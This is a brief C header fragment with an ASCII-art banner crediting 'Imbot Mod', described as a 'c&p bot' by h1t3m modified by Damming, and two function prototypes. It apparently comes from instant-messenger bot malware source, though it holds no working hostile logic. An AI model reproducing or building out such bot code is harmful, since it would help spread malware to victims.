/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
Imbot Mod - A c&p bot made by h1t3m and modified by Damming
*/
SWITCHES GetSwitches(char *a[MAX_TOKENS],int t);
void HookProtocol(void *conn);
